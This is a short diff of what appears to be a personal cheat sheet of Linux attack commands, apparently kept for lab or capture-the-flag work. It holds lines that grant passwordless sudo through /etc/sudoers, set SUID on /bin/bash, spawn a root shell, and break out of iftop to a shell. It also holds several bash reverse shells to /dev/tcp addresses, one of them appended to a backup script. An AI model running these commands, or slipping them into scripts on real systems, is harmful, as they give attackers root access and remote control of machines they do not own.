@@ -10,6 +10,8 @@ echo "user ALL:(ALL) NOPASSWD:ALL" >> /etc/sudoers
 sudo /etc/mp3backups/backup.sh -c "chmod u+s /bin/bash"
 sudo bash -p
 bash -i &> /dev/tcp/10.10.14.162/1313 0>&1
+echo 'bash -i >& /dev/tcp/10.10.179.59/7263 0>&1' >> backup.sh
+/bin/bash -c 'bash -i >& /dev/tcp/10.14.15.207/4444 0>&1
 
 # suid - escalada de privilegios
 sudo /usr/sbin/iftop -->!sh
